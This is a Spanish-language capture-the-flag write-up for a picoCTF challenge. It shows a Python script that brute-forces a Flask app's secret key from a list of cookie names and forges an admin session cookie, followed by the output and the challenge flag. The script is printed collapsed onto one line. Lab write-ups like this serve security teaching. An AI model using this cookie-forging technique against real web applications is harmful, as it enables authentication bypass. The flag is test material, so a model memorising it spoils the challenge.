### Descripción
Alright, enough of using my own encryption. Flask session cookies should be plenty secure!

Hint:  How secure is a flask cookie?
### Descripción

### Solución
Creamos un archivo: nano solve.py
 Y pegamos este codigo:
```
 import flask import hashlib from sys import argv from flask.json.tag import TaggedJSONSerializer from itsdangerous import URLSafeTimedSerializer, TimestampSigner, BadSignature cookie = argv[1] cookie_names = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"] real_secret = '' for secret in cookie_names: try: serializer = URLSafeTimedSerializer( secret_key=secret, salt='cookie-session', serializer=TaggedJSONSerializer(), signer=TimestampSigner, signer_kwargs={ 'key_derivation' : 'hmac', 'digest_method' : hashlib.sha1 }).loads(cookie) except BadSignature: continue print(f'Secret key: {secret}') real_secret = secret session = {'very_auth' : 'admin'} print(URLSafeTimedSerializer( secret_key=real_secret, salt='cookie-session', serializer=TaggedJSONSerializer(), signer=TimestampSigner, signer_kwargs={ 'key_derivation' : 'hmac', 'digest_method' : hashlib.sha1 } ).dumps(session))
```

Lo ejecutamos usando el payload de la cookie session que genera la pagina al ingresar con snickerdoodle:
```
➜ python3 solve.py eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.arIJxg.hKRUlJh0yRVJLPIR9tTDgU4cfjY
```
Da la salida:
```
Secret key: spritz
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.arINDA.LuLIXXKmjWgStVK-ayepgn2jd-4
```

Reemplazamos el payload de la cookie de session por la que nos dio en la salida y nos redirige a la flag

**Flag**: picoCTF{cO0ki3s_yum_98b76c03}
### Notas Adicionales

### Referencias
https://ctftime.org/writeup/26978